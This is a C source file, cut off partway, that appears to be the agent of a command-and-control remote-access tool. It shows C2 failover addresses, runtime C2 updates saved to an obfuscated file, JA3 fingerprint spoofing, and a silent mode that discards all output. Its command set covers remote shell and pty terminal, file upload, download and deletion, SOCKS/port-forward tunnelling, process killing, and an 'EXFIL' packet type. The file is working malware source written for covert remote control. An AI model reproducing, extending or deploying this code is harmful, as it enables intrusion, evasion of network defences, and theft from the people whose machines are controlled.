#ifndef _GNU_SOURCE

#define _GNU_SOURCE

#endif



#include <stdio.h>

#include <string.h>

#include <strings.h>

#include <stdlib.h>

#include <stdint.h>

#include <time.h>

#include <math.h>

#include <ctype.h>

#include <errno.h>

#include <locale.h>

#include <pty.h>

#include <fcntl.h>

#include <signal.h>
#ifdef _WIN32
#include <windows.h>
#endif





#include <sys/utsname.h>

#include <termios.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <sys/wait.h>

#include <sys/random.h>

#include <arpa/inet.h>

#include <netdb.h>

#include <sys/select.h>

#include <sys/time.h>
#include <sys/ioctl.h>

#ifndef _WIN32

#include <poll.h>

#endif



#include <sys/stat.h>

#include <pwd.h>

#include <grp.h>



#include "mongoose.h"

#include "uthash.h"



#include "mbedtls/pk.h"

#include "mbedtls/entropy.h"

#include "mbedtls/ctr_drbg.h"

#include "mbedtls/error.h"

#include "mbedtls/md.h"

#include "mbedtls/rsa.h"



#include "aes.h"

#include "gcm.h"

#include "rc5.h"

#include "mpack.h"

#include "session_key_manager.h"

#include "ja3_fingerprint.h"

#include "common.h"

#if TRANSPORT_TLS == 1
#include "generated_tls_data.h"
#endif

#if PAYLOAD_ENCRYPTION == 1 && KEY_EXCHANGE_MODE == 1
#include "rsa_key_exchange.h"
#endif

#if PAYLOAD_ENCRYPTION == 1
#include "aes.h"  // tiny-aes
#endif

#define PAYLOAD_CIPHER_AES_GCM 1
#define PAYLOAD_CIPHER_RC5 3

static ja3_manager_t g_ja3_manager;

static const char* get_current_client_addr(void);
static int parse_address_host_port(const char* address, char* host, size_t host_size, int* port);
static int build_connect_url(const char* host, int port, char* out, size_t out_size);
static int format_endpoint_for_log(const char* host, int port, char* out, size_t out_size);
static int is_ip_literal(const char* host);
static void safe_strncpy(char* dst, const char* src, size_t size);
static void finalize_main_connection_ready(struct mg_connection *c);
static int set_socket_nonblocking_platform(int fd);
static int connect_tcp_endpoint(const char* host, int port, int timeout_ms, int* out_err, int* out_timeout);
static int persist_runtime_c2_addresses(const char* const* addresses, int count);
static int load_persisted_c2_addresses(void);
static int normalize_callback_address_string(const char* input, char* out, size_t out_size);
static int update_c2_address_list(const char* const* addresses, int count);

// ========================================
// TLS Configuration (TRANSPORT_TLS == 1)
// ========================================

#if TRANSPORT_TLS == 1

static struct mg_str load_embedded_tls_pem(const char *pem, const char *label) {
    size_t len = pem != NULL ? strlen(pem) : 0;
    if (len == 0) {
        printf("[ERROR] %s content is missing\n", label);
        return mg_str(NULL);
    }
    return mg_str_n(pem, len);
}

static struct mg_str load_tls_cert(void) {
    return load_embedded_tls_pem(g_embedded_tls_cert_pem, "TLS client cert");
}

static struct mg_str load_tls_key(void) {
    return load_embedded_tls_pem(g_embedded_tls_key_pem, "TLS client key");
}

static struct mg_str load_tls_ca(void) {
    return load_embedded_tls_pem(g_embedded_tls_ca_pem, "TLS CA");
}

static int setup_tls(struct mg_connection *c) {
    OBF_SENSITIVE_ENTER(0x3101u);
    struct mg_tls_opts opts = {0};

    opts.ca = load_tls_ca();
    if (opts.ca.buf == NULL || opts.ca.len == 0) {
        printf("[ERROR] TLS CA content is missing\n");
        return -1;
    }
    printf("[INFO] TLS CA loaded from embedded build data\n");

    opts.cert = load_tls_cert();
    opts.key = load_tls_key();
    if (opts.cert.buf == NULL || opts.cert.len == 0) {
        printf("[ERROR] TLS client cert content is missing\n");
        return -1;
    }
    if (opts.key.buf == NULL || opts.key.len == 0) {
        printf("[ERROR] TLS client key content is missing\n");
        return -1;
    }
    printf("[INFO] TLS client cert/key loaded from embedded build data\n");

    // Get random JA3 fingerprint for TLS fingerprint spoofing
    const ja3_config_t *ja3 = ja3_manager_get_random(&g_ja3_manager);
    if (ja3 != NULL) {
        printf("[JA3] Using fingerprint: %s (hash: %s)\n", ja3->name, ja3->ja3_hash);
        opts.tls_min_version = ja3->tls_min_version;
        opts.tls_max_version = ja3->tls_max_version;
        opts.cipher_suites = ja3->cipher_suites;
        opts.elliptic_curves = ja3->elliptic_curves;
    } else {
        printf("[JA3] Warning: No fingerprints available, using default TLS config\n");
    }

    // Extract hostname from current client address
    const char *current_addr = get_current_client_addr();
    char hostname[256] = {0};
    int tmp_port = 0;
    int ip_callback = 0;
    if (parse_address_host_port(current_addr, hostname, sizeof(hostname), &tmp_port) != 0) {
        printf("[ERROR] TLS: Failed to parse address for SNI: %s\n", current_addr);
        return -1;
    }

    ip_callback = is_ip_literal(hostname);
    if (ip_callback) {
        opts.name = mg_str("");
        printf("[INFO] TLS: Initializing with CA cert, client cert, ip=%s\n", hostname);
        printf("[INFO] TLS verify mode: CA only (IP callback)\n");
    } else {
        opts.name = mg_str(hostname);
        printf("[INFO] TLS: Initializing with CA cert, client cert, hostname=%s\n", hostname);
        printf("[INFO] TLS verify mode: CA + hostname\n");
    }
    opts.skip_verification = 0;

    mg_tls_init(c, &opts);

    return c->is_tls ? 0 : -1;
}

#endif // TRANSPORT_TLS == 1

static void configure_release_silence(void) {
#if AGENT_SILENT_RELEASE
#ifdef _WIN32
    const char *null_device = "NUL";
#else
    const char *null_device = "/dev/null";
#endif
    FILE *discard = freopen(null_device, "r", stdin);
    if (discard == NULL) return;
    discard = freopen(null_device, "w", stdout);
    if (discard == NULL) return;
    discard = freopen(null_device, "w", stderr);
    (void) discard;
#endif
}





#ifdef _WIN32

#include <windows.h>

#include <process.h>

#define THREAD_HANDLE HANDLE

#define THREAD_FUNC unsigned __stdcall

#define CREATE_THREAD(handle, func, arg) ((handle = (HANDLE)_beginthreadex(NULL, 0, func, arg, 0, NULL)) != NULL)

#define JOIN_THREAD(handle) WaitForSingleObject(handle, INFINITE)

#define CLOSE_THREAD(handle) CloseHandle(handle)

#else

#include <pthread.h>

#include <unistd.h>

#include <ifaddrs.h>

#include <net/if.h>

#define THREAD_HANDLE pthread_t

#define THREAD_FUNC void*

#define CREATE_THREAD(handle, func, arg) (pthread_create(&(handle), NULL, func, arg) == 0)

#define JOIN_THREAD(handle) pthread_join(handle, NULL)

#define CLOSE_THREAD(handle) (void)handle

#endif



#if defined(__GNUC__) || defined(__clang__)

#define MAYBE_UNUSED __attribute__((unused))

#else

#define MAYBE_UNUSED

#endif







#define RSA_KEY_SIZE 2048

#define RSA_EXPONENT 65537



// ========================================



// ========================================

// Multi-address failover configuration (3 addresses)

// Agent connects to Server (reverse connection)

#ifndef CLIENT_ADDR_1

#define CLIENT_ADDR_1 "127.0.0.1:8080"  // Primary server address

#endif



#ifndef CLIENT_ADDR_2

#define CLIENT_ADDR_2 ""                // Secondary address (empty = skip)

#endif



#ifndef CLIENT_ADDR_3

#define CLIENT_ADDR_3 ""                // Tertiary address (empty = skip)

#endif



// Global address index for failover

static int g_current_addr_index = 0;

static const char* g_default_client_addrs[3] = { CLIENT_ADDR_1, CLIENT_ADDR_2, CLIENT_ADDR_3 };

static const char* g_client_addrs[3] = { CLIENT_ADDR_1, CLIENT_ADDR_2, CLIENT_ADDR_3 };

static const int g_addr_count = 3;

#define RUNTIME_C2_MAX_ADDRS 3
#define RUNTIME_C2_ADDR_LEN 320
#define RUNTIME_C2_STORE_NAME ""
#define RUNTIME_C2_STORE_MAGIC 0x72326366u
#define RUNTIME_C2_STORE_VERSION 1u

static char g_runtime_client_addrs[RUNTIME_C2_MAX_ADDRS][RUNTIME_C2_ADDR_LEN];

static int g_runtime_c2_loaded = 0;

static pthread_mutex_t g_runtime_c2_mutex = PTHREAD_MUTEX_INITIALIZER;



static int safe_mod_positive(int value, int divisor) {

    if (divisor <= 0) {

        return 0;

    }

    value %= divisor;

    if (value < 0) {

        value += divisor;

    }

    return value;

}



// Get current address string

static const char* get_current_client_addr(void) {

    pthread_mutex_lock(&g_runtime_c2_mutex);

    // Find next non-empty address starting from current index

    for (int i = 0; i < g_addr_count; i++) {

        int idx = safe_mod_positive(g_current_addr_index + i, g_addr_count);

        if (g_client_addrs[idx] != NULL && g_client_addrs[idx][0] != '\0') {

            g_current_addr_index = idx;

            {

                const char* selected = g_client_addrs[idx];
                pthread_mutex_unlock(&g_runtime_c2_mutex);
                return selected;

            }

        }

    }

    // Fallback to primary address if all runtime entries are empty

    {

        const char* fallback = g_client_addrs[0] != NULL && g_client_addrs[0][0] != '\0'
            ? g_client_addrs[0]
            : CLIENT_ADDR_1;
        pthread_mutex_unlock(&g_runtime_c2_mutex);
        return fallback;

    }

}



// Switch to next address (returns new address or NULL if no more)

static const char* switch_to_next_addr(void) {

    int start_idx = g_current_addr_index;

    pthread_mutex_lock(&g_runtime_c2_mutex);

    for (int i = 1; i <= g_addr_count; i++) {

        int idx = safe_mod_positive(start_idx + i, g_addr_count);

        if (g_client_addrs[idx] != NULL && g_client_addrs[idx][0] != '\0') {

            g_current_addr_index = idx;

            printf("[main] Switched to backup address %d: %s\n", idx + 1, g_client_addrs[idx]);

            {

                const char* selected = g_client_addrs[idx];
                pthread_mutex_unlock(&g_runtime_c2_mutex);
                return selected;

            }

        }

    }

    // All addresses tried, reset to first and return NULL to indicate full cycle

    g_current_addr_index = 0;

    pthread_mutex_unlock(&g_runtime_c2_mutex);

    return NULL;

}



// Reset to first address

static void reset_addr_index(void) {

    pthread_mutex_lock(&g_runtime_c2_mutex);
    g_current_addr_index = 0;
    pthread_mutex_unlock(&g_runtime_c2_mutex);

}

static void obfuscate_runtime_c2_blob(unsigned char* data, size_t len) {

    if (data == NULL) {

        return;

    }

    for (size_t i = 0; i < len; i++) {

        unsigned char mask = (unsigned char) (0x5aU ^ (unsigned char) ((i * 17U) & 0xffU) ^ (unsigned char) (((i % 13U) + 1U) * 11U));
        data[i] ^= mask;

    }

}

static int get_runtime_c2_store_path(char* out, size_t out_size) {

    char exe_path[PATH_MAX];
    char* slash = NULL;

    if (out == NULL || out_size == 0) {

        return -1;

    }

    memset(exe_path, 0, sizeof(exe_path));

#ifdef _WIN32
    {

        DWORD len = GetModuleFileNameA(NULL, exe_path, (DWORD) (sizeof(exe_path) - 1));
        if (len == 0 || len >= sizeof(exe_path)) {

            return -1;

        }

    }
    slash = strrchr(exe_path, '\\');
    if (slash == NULL) slash = strrchr(exe_path, '/');
#else
    {

        if (obf_read_self_exe(exe_path, sizeof(exe_path)) != 0) {

            return -1;

        }

    }
    slash = strrchr(exe_path, '/');
#endif

    if (slash == NULL) {

        return -1;

    }

    *slash = '\0';

    {
        char store_name[32];
        obf_decode_string(OBF_STR_RUNTIME_C2_STORE_NAME, store_name, sizeof(store_name));
#ifdef _WIN32
        if (snprintf(out, out_size, "%s\\%s", exe_path, store_name) <= 0 || strlen(out) >= out_size) {
            obf_secure_zero(store_name, sizeof(store_name));
            return -1;
        }
#else
        if (snprintf(out, out_size, "%s/%s", exe_path, store_name) <= 0 || strlen(out) >= out_size) {
            obf_secure_zero(store_name, sizeof(store_name));
            return -1;
        }
#endif
        obf_secure_zero(store_name, sizeof(store_name));
    }

    return 0;

}

static void clear_runtime_c2_addresses_locked(void) {

    for (int i = 0; i < g_addr_count; i++) {

        memset(g_runtime_client_addrs[i], 0, sizeof(g_runtime_client_addrs[i]));
        g_client_addrs[i] = g_default_client_addrs[i];

    }

    g_runtime_c2_loaded = 0;
    g_current_addr_index = 0;

}

static int apply_runtime_c2_addresses_locked(const char* const* addresses, int count) {

    if (count <= 0 || count > g_addr_count) {

        return -1;

    }

    for (int i = 0; i < g_addr_count; i++) {

        memset(g_runtime_client_addrs[i], 0, sizeof(g_runtime_client_addrs[i]));
        if (i < count && addresses[i] != NULL && addresses[i][0] != '\0') {

            safe_strncpy(g_runtime_client_addrs[i], addresses[i], sizeof(g_runtime_client_addrs[i]));
            g_client_addrs[i] = g_runtime_client_addrs[i];

        } else {

            g_client_addrs[i] = "";

        }

    }

    g_runtime_c2_loaded = 1;
    g_current_addr_index = 0;
    return 0;

}

static int normalize_callback_address_string(const char* input, char* out, size_t out_size) {

    char host[256];
    int port = 0;

    if (parse_address_host_port(input, host, sizeof(host), &port) != 0) {

        return -1;

    }

    return build_connect_url(host, port, out, out_size);

}

static int persist_runtime_c2_addresses(const char* const* addresses, int count) {

    char final_path[PATH_MAX];
    char temp_path[PATH_MAX];
    unsigned char plain[2048];
    unsigned char encoded[2048];
    size_t offset = 0;
    FILE* fp = NULL;

    if (count <= 0 || count > g_addr_count) {

        return -1;

    }

    if (get_runtime_c2_store_path(final_path, sizeof(final_path)) != 0) {

        fprintf(stderr, "[persist] Failed to resolve runtime C2 store path\n");
        return -1;

    }

    memset(plain, 0, sizeof(plain));
    plain[offset++] = (unsigned char) ((RUNTIME_C2_STORE_MAGIC >> 24) & 0xff);
    plain[offset++] = (unsigned char) ((RUNTIME_C2_STORE_MAGIC >> 16) & 0xff);
    plain[offset++] = (unsigned char) ((RUNTIME_C2_STORE_MAGIC >> 8) & 0xff);
    plain[offset++] = (unsigned char) (RUNTIME_C2_STORE_MAGIC & 0xff);
    plain[offset++] = (unsigned char) RUNTIME_C2_STORE_VERSION;
    plain[offset++] = (unsigned char) count;

    for (int i = 0; i < count; i++) {

        size_t addr_len;
        if (addresses[i] == NULL || addresses[i][0] == '\0') {

            return -1;

        }

        addr_len = strlen(addresses[i]);
        if (addr_len == 0 || addr_len > 0xffff || offset + 2 + addr_len > sizeof(plain)) {

            return -1;

        }

        plain[offset++] = (unsigned char) ((addr_len >> 8) & 0xff);
        plain[offset++] = (unsigned char) (addr_len & 0xff);
        memcpy(plain + offset, addresses[i], addr_len);
        offset += addr_len;

    }

    memcpy(encoded, plain, offset);
    obfuscate_runtime_c2_blob(encoded, offset);

    if (snprintf(temp_path, sizeof(temp_path), "%s.tmp", final_path) <= 0 || strlen(temp_path) >= sizeof(temp_path)) {

        return -1;

    }

    fp = fopen(temp_path, "wb");
    if (fp == NULL) {

        fprintf(stderr, "[persist] Failed to open runtime C2 temp store '%s': errno=%d (%s)\n", temp_path, errno, strerror(errno));
        return -1;

    }

    if (fwrite(encoded, 1, offset, fp) != offset) {

        fclose(fp);
        remove(temp_path);
        fprintf(stderr, "[persist] Failed to write runtime C2 temp store '%s': errno=%d (%s)\n", temp_path, errno, strerror(errno));
        return -1;

    }

    if (fclose(fp) != 0) {

        remove(temp_path);
        fprintf(stderr, "[persist] Failed to close runtime C2 temp store '%s': errno=%d (%s)\n", temp_path, errno, strerror(errno));
        return -1;

    }

    if (rename(temp_path, final_path) != 0) {

        remove(temp_path);
        fprintf(stderr, "[persist] Failed to replace runtime C2 store '%s': errno=%d (%s)\n", final_path, errno, strerror(errno));
        return -1;

    }

    return 0;

}

static int load_persisted_c2_addresses(void) {

    char final_path[PATH_MAX];
    unsigned char encoded[2048];
    unsigned char plain[2048];
    char normalized[RUNTIME_C2_MAX_ADDRS][RUNTIME_C2_ADDR_LEN];
    const char* normalized_ptrs[RUNTIME_C2_MAX_ADDRS];
    FILE* fp = NULL;
    size_t file_len = 0;
    size_t offset = 0;
    int count = 0;
    uint32_t magic = 0;

    if (get_runtime_c2_store_path(final_path, sizeof(final_path)) != 0) {

        return -1;

    }

    fp = fopen(final_path, "rb");
    if (fp == NULL) {

        return -1;

    }

    file_len = fread(encoded, 1, sizeof(encoded), fp);
    fclose(fp);
    fp = NULL;

    if (file_len < 6) {

        return -1;

    }

    memcpy(plain, encoded, file_len);
    obfuscate_runtime_c2_blob(plain, file_len);

    magic = ((uint32_t) plain[0] << 24) | ((uint32_t) plain[1] << 16) | ((uint32_t) plain[2] << 8) | (uint32_t) plain[3];
    if (magic != RUNTIME_C2_STORE_MAGIC || plain[4] != RUNTIME_C2_STORE_VERSION) {

        return -1;

    }

    count = (int) plain[5];
    if (count <= 0 || count > g_addr_count) {

        return -1;

    }

    offset = 6;
    for (int i = 0; i < count; i++) {

        uint16_t addr_len;
        if (offset + 2 > file_len) {

            return -1;

        }

        addr_len = (uint16_t) (((uint16_t) plain[offset] << 8) | (uint16_t) plain[offset + 1]);
        offset += 2;
        if (addr_len == 0 || offset + addr_len > file_len || addr_len >= sizeof(normalized[i])) {

            return -1;

        }

        memcpy(normalized[i], plain + offset, addr_len);
        normalized[i][addr_len] = '\0';
        offset += addr_len;

        if (normalize_callback_address_string(normalized[i], normalized[i], sizeof(normalized[i])) != 0) {

            return -1;

        }

        normalized_ptrs[i] = normalized[i];

    }

    pthread_mutex_lock(&g_runtime_c2_mutex);
    if (apply_runtime_c2_addresses_locked(normalized_ptrs, count) != 0) {

        pthread_mutex_unlock(&g_runtime_c2_mutex);
        return -1;

    }
    pthread_mutex_unlock(&g_runtime_c2_mutex);

    printf("[persist] Loaded callback addresses from local store\n");
    return count;

}





#ifndef PACKET_HEADER_SIZE

#define PACKET_HEADER_SIZE 4

#endif



#ifndef MAX_PACKET_SIZE

#define MAX_PACKET_SIZE (1024 * 1024)

#endif





#ifndef ENABLE_RECONNECT

#define ENABLE_RECONNECT 1

#endif



#ifndef RECONNECT_BASE_DELAY

#define RECONNECT_BASE_DELAY 5000       // Base reconnect delay (milliseconds)

#endif



#ifndef RECONNECT_MAX_DELAY

#define RECONNECT_MAX_DELAY 60000       // Max reconnect delay (milliseconds)

#endif



#ifndef RECONNECT_JITTER

#define RECONNECT_JITTER 50             // Jitter percentage (0-100)

#endif



#ifndef MAX_RECONNECT_ATTEMPTS

#define MAX_RECONNECT_ATTEMPTS 0

#endif



#ifndef BEACON_ONLINE_WINDOW_MS

#define BEACON_ONLINE_WINDOW_MS 5000    // Beacon online window before active reconnect

#endif



#ifndef DNS_RESOLVE_INTERVAL

#define DNS_RESOLVE_INTERVAL 300

#endif



// Encryption configuration (can be overridden by compile definitions)

// TRANSPORT_TLS: 0=off, 1=enabled

// PAYLOAD_ENCRYPTION: 0=plain payload, 1=AES-GCM payload encryption

#ifndef TRANSPORT_TLS

#define TRANSPORT_TLS 0

#endif



#ifndef PAYLOAD_ENCRYPTION

#define PAYLOAD_ENCRYPTION 0

#endif



#ifndef KEY_EXCHANGE_MODE

#define KEY_EXCHANGE_MODE 0

#endif



#ifndef AES_KEY_SIZE

#define AES_KEY_SIZE 16

#endif



#ifndef AES_IV_SIZE

#define AES_IV_SIZE 16

#endif



#ifndef KEY_HEX

#define KEY_HEX ""

#endif



// TLS credentials are embedded at build time when TRANSPORT_TLS == 1.




#ifndef TLS_CA_FILE

#define TLS_CA_FILE   "ca.crt"

#endif





#define CMD_ECHO        0x01

#define CMD_CONNECT     0x02

#define CMD_DISCONNECT  0x03

#define CMD_RSA_ENCRYPT 0x04

#define CMD_RSA_DECRYPT 0x05





// ========================================



// ========================================





typedef struct thread_context {

    int thread_id;

    THREAD_HANDLE thread;

    char server_addr[128];

    int running;

    int exited;

    int reconnect_attempts;

    int reconnect_delay;

    UT_hash_handle hh;

} thread_context_t;







static thread_context_t* g_threads = NULL;

static int g_next_thread_id = 0;

volatile int g_shutdown = 0;



// Runtime reconnect configuration

static int g_reconnect_base_delay = RECONNECT_BASE_DELAY;

static int g_reconnect_jitter_pct = RECONNECT_JITTER;

static int g_beacon_interval_ms = RECONNECT_BASE_DELAY;

static int g_beacon_jitter_pct = RECONNECT_JITTER;

static volatile int g_main_conn_ready = 0;

static volatile int g_main_conn_intentional_close = 0;

static volatile int g_main_force_reconnect = 0;

static volatile int g_main_sleep_reconnect = 0;

static volatile int g_beacon_sleep_enabled = 0;

static int g_realtime_hold_count = 0;

static pthread_mutex_t g_realtime_hold_mutex = PTHREAD_MUTEX_INITIALIZER;

static int g_main_inflight_tasks = 0;

static uint64_t g_main_last_activity_ms = 0;

static uint64_t g_main_connected_at_ms = 0;

static uint64_t g_main_online_deadline_ms = 0;

static int g_main_conn_fd = -1;

static struct mg_connection* g_main_active_conn = NULL;

static pthread_mutex_t g_main_state_mutex = PTHREAD_MUTEX_INITIALIZER;





typedef struct tunnel_session {

    int channel_id;

    THREAD_HANDLE thread;

    volatile int running;

    volatile int paused;

    volatile int exited;

    int relay_fd;

    int target_fd;

    int realtime_held;

    char proto[16];

    char address[256];

    UT_hash_handle hh;

} tunnel_session_t;



static tunnel_session_t* g_tunnel_sessions = NULL;

static pthread_mutex_t g_tunnel_sessions_mutex = PTHREAD_MUTEX_INITIALIZER;







typedef enum {

    INIT_PACK = 1,

    EXFIL_PACK = 2,

    JOB_PACK = 3,

    JOB_TUNNEL = 4,

    JOB_TERMINAL = 5

} PacketType;





typedef enum {

    MSG_TYPE_INIT = 1,

    MSG_TYPE_TASK = 2,

    MSG_TYPE_RESULT = 3,

    MSG_TYPE_HEARTBEAT = 99,

    MSG_TYPE_TERMINAL = 5,

    MSG_TYPE_FILEMANAGER = 6

} MessageType;



typedef enum {

    TASK_CODE_FILE_LIST = 12,

    TASK_CODE_SHELL = 23,

    TASK_CODE_TERMINAL = 35,

    TASK_CODE_FILE_UPLOAD = 40,

    TASK_CODE_FILE_DOWNLOAD = 41,

    TASK_CODE_FILEMANAGER = 50,

    TASK_CODE_UPDATE_CONFIG = 60,

    TASK_CODE_UPDATE_C2 = 61,

    TASK_CODE_UPDATE_HEARTBEAT = 62

} TaskCode;



typedef enum {

    JITTER_MODE_FIXED = 0,

    JITTER_MODE_RANDOM = 1,

    JITTER_MODE_NORMAL = 2,

    JITTER_MODE_EXPONENTIAL = 3

} JitterMode;





typedef enum {

    CMD_CODE_EXIT = 4,                // Graceful exit command

    CMD_CODE_FILE_DOWNLOAD = 5,

    CMD_CODE_FILE_UPLOAD = 6,

    CMD_CODE_FILE_REMOVE = 11,

    CMD_CODE_FILE_LISTDIR = 12,

    CMD_CODE_SLEEP = 21,              // Sleep/Jitter configuration

    CMD_CODE_TUNNEL_START = 31,       // Tunnel start (SOCKS/portfwd transport)

    CMD_CODE_TUNNEL_STOP = 32,        // Tunnel stop

    CMD_CODE_TUNNEL_PAUSE = 33,       // Tunnel pause

    CMD_CODE_TUNNEL_RESUME = 34,      // Tunnel resume

    CMD_CODE_SHELL = 35,              // Terminal start

    CMD_CODE_TERMINAL_STOP = 36,      // Terminal stop

    CMD_CODE_TERMINAL_RESIZE = 37,    // Terminal resize







    CMD_CODE_PROCESS_LIST = 51,

    CMD_CODE_PROCESS_KILL = 52,

    CMD_CODE_UPDATE_C2 = 61,

} command_code_t;





typedef struct {

    uint32_t agent_id;

    uint32_t command_code;

    int valid;

} command_header_t;





typedef struct {

    command_header_t header;

    uint32_t task_id;

    int interval;    // Sleep interval in seconds

    int jitter;      // Jitter percentage (0-100)

} sleep_command_t;

typedef struct {

    command_header_t header;

    uint32_t task_id;

    int immediate;

    int address_count;

    char addresses[RUNTIME_C2_MAX_ADDRS][RUNTIME_C2_ADDR_LEN];

} update_c2_command_t;





typedef struct {

    command_header_t header;

    uint32_t task_id;

    int channel_id;

    char proto[16];

    char address[256];

} tunnel_start_command_t;



typedef struct {

    command_header_t header;

    uint32_t task_id;

    int channel_id;

} tunnel_control_command_t;





typedef struct {

    command_header_t header;

    uint32_t task_id;

    uint32_t term_id;

    char program[256];

    char** args;

    int args_count;

    char** env;

    int env_count;

    char cwd[256];





    uint16_t width;

    uint16_t height;

} shell_command_t;





typedef struct {

    command_header_t header;

    uint32_t task_id;

    char path[512];

} file_listdir_command_t;





typedef struct {

    char mode[16];

    uint32_t nlink;

    char user[64];

    char group[64];

    uint64_t size;

    char date[32];

    char filename[256];

    uint8_t is_dir;

} file_info_t;





typedef struct {

    uint32_t task_id;

    uint32_t command_code;

    uint8_t result;          // 1=success, 0=error

    char path[512];

    char status[256];

    file_info_t* files;

    size_t file_count;

} response_listdir_t;





typedef struct {

    command_header_t header;



    uint32_t task_id;

    char path[PATH_MAX];

    uint64_t offset;

    unsigned char* content;

    size_t content_len;

    int finish;

    int compress;

} file_upload_command_t;





typedef struct {

    command_header_t header;

    uint32_t task_id;

    uint32_t command_code;

    char task[64];

    char path[512];

    uint32_t file_id;

    char remote_path[512];

    char local_path[512];

    uint64_t offset;

    uint64_t length;

    uint64_t expect_size;

    int64_t expect_mtime;

} file_download_command_t;



typedef struct {

    command_header_t header;

    uint32_t task_id;

    char path[PATH_MAX];

} file_remove_command_t;









typedef struct {

    unsigned char* data;

    size_t len;

} Buffer;



typedef struct {

    char* task_id;

    char* path;

    int file_id;

    uint64_t offset;

    uint64_t expect_size;

    int64_t expect_mtime;

} DownloadArgs;





typedef struct {

    command_code_t type;

    union {

        command_header_t header;

        shell_command_t shell;

        file_listdir_command_t file_listdir;

        file_upload_command_t file_upload;

        file_download_command_t file_download;

        file_remove_command_t file_remove;

        sleep_command_t sleep;

        update_c2_command_t update_c2;

        tunnel_start_command_t tunnel_start;

        tunnel_control_command_t tunnel_control;



    } data;

} parsed_command_t;





void free_shell_command(shell_command_t* cmd);

void free_parsed_command(parsed_command_t* cmd);



void free_shell_command(shell_command_t* cmd) {

    if (!cmd) {

        return;

    }



    if (cmd->args) {

        for (int i = 0; i < cmd->args_count; i++) {

            if (cmd->args[i]) {

                free(cmd->args[i]);

            }

        }

        free(cmd->args);

        cmd->args = NULL;

    }

    cmd->args_count = 0;



    if (cmd->env) {

        for (int i = 0; i < cmd->env_count; i++) {

            if (cmd->env[i]) {

                free(cmd->env[i]);

            }

        }

        free(cmd->env);

        cmd->env = NULL;

    }

    cmd->env_count = 0;

}



void free_parsed_command(parsed_command_t* cmd) {

    if (!cmd) {

        return;

    }



    if (cmd->type == CMD_CODE_SHELL || cmd->type == CMD_CODE_TERMINAL_STOP) {

        free_shell_command(&cmd->data.shell);

    }

}







typedef struct {

    volatile int value;

} atomic_int_compat;



typedef struct {

    volatile long long value;

} atomic_int64_compat;



#define ATOMIC_VAR_INIT(val) {val}



static inline int atomic_load_compat(atomic_int_compat* obj) {

    __sync_synchronize();

    return obj->value;

}



static inline void atomic_store_compat(atomic_int_compat* obj, int val) {

    obj->value = val;

    __sync_synchronize();

}



static inline int atomic_fetch_add_compat(atomic_int_compat* obj, int val) {

    return __sync_fetch_and_add(&obj->value, val);

}



static inline long long atomic_load64_compat(atomic_int64_compat* obj) {

    __sync_synchronize();

    return obj->value;

}



static inline void atomic_store64_compat(atomic_int64_compat* obj, long long val) {

    obj->value = val;

    __sync_synchronize();

}





typedef enum {

    LOG_DEBUG = 0,

    LOG_INFO = 1,

    LOG_WARN = 2,

    LOG_ERROR = 3,

    LOG_FATAL = 4

} LogLevel;



#if AGENT_DEBUG_OUTPUT

static MAYBE_UNUSED LogLevel g_log_level = LOG_DEBUG;

#else

static MAYBE_UNUSED LogLevel g_log_level = LOG_INFO;

#endif

static MAYBE_UNUSED pthread_mutex_t g_log_mutex = PTHREAD_MUTEX_INITIALIZER;



static void log_message(LogLevel level, const char* fmt, ...) {

#if AGENT_SILENT_RELEASE

    (void)level;

    (void)fmt;

    return;

#else

    if (level < g_log_level) return;



    const char* level_str[] = { "DEBUG", "INFO", "WARN", "ERROR", "FATAL" };

    time_t now;

    struct tm* tm_info;

    char time_buf[64];

    va_list args;



    time(&now);

    tm_info = localtime(&now);

    strftime(time_buf, sizeof(time_buf), "%Y-%m-%d %H:%M:%S", tm_info);



    pthread_mutex_lock(&g_log_mutex);



    fprintf(stderr, "[%s] [%s] ", time_buf, level_str[level]);



    va_start(args, fmt);

    vfprintf(stderr, fmt, args);

    va_end(args);



    fprintf(stderr, "\n");

    fflush(stderr);



    pthread_mutex_unlock(&g_log_mutex);

#endif

}



#define LOG_DEBUG(...) log_message(LOG_DEBUG, __VA_ARGS__)

#define LOG_INFO(...)  log_message(LOG_INFO, __VA_ARGS__)

#define LOG_WARN(...)  log_message(LOG_WARN, __VA_ARGS__)

#define LOG_ERROR(...) log_message(LOG_ERROR, __VA_ARGS__)

#define LOG_FATAL(...) log_message(LOG_FATAL, __VA_ARGS__)





typedef struct {

    atomic_int_compat connected;

    atomic_int_compat should_exit;

    atomic_int64_compat last_heartbeat_recv;

    atomic_int64_compat last_heartbeat_send;

    atomic_int_compat socket_fd;

    atomic_int_compat reconnect_count;

    atomic_int_compat heartbeat_failures;

} GlobalState;



static GlobalState g_state = {

    ATOMIC_VAR_INIT(0),

    ATOMIC_VAR_INIT(0),

    ATOMIC_VAR_INIT(0),

    ATOMIC_VAR_INIT(0),

    ATOMIC_VAR_INIT(-1),

    ATOMIC_VAR_INIT(0),

    ATOMIC_VAR_INIT(0)

};



// ========================================



// ========================================



// Calculate jitter based on percentage of base delay (milliseconds)

static int get_jitter_with_base(int base_delay_ms) {

    int max_jitter = (base_delay_ms * g_reconnect_jitter_pct) / 100;

    if (max_jitter <= 0) return 0;

    return (rand() % (max_jitter * 2 + 1)) - max_jitter;

}



static int get_jitter_with_pct(int base_delay_ms, int jitter_pct) {

    int max_jitter = (base_delay_ms * jitter_pct) / 100;

    if (max_jitter <= 0) return 0;

    return (rand() % (max_jitter * 2 + 1)) - max_jitter;

}



static int get_beacon_sleep_delay_ms(void) {

    if (g_beacon_interval_ms <= 0) {

        return 0;

    }

    int delay = g_beacon_interval_ms + get_jitter_with_pct(g_beacon_interval_ms, g_beacon_jitter_pct);

    // Ensure beacon sleep never drops below 1 second when sleep mode is enabled.

    if (delay < 1000) delay = 1000;

    return delay;

}



static uint64_t get_platform_time_ms(void) {

#ifdef _WIN32

    return ((uint64_t)time(NULL)) * 1000ULL;

#else

    struct timespec ts;
    struct timeval tv;

#ifdef CLOCK_MONOTONIC
    memset(&ts, 0, sizeof(ts));
    if (clock_gettime(CLOCK_MONOTONIC, &ts) == 0) {
        return ((uint64_t)ts.tv_sec * 1000ULL) + ((uint64_t)ts.tv_nsec / 1000000ULL);
    }
#endif

#ifdef CLOCK_REALTIME
    memset(&ts, 0, sizeof(ts));
    if (clock_gettime(CLOCK_REALTIME, &ts) == 0) {
        return ((uint64_t)ts.tv_sec * 1000ULL) + ((uint64_t)ts.tv_nsec / 1000000ULL);
    }
#endif

    memset(&tv, 0, sizeof(tv));
    if (gettimeofday(&tv, NULL) == 0) {
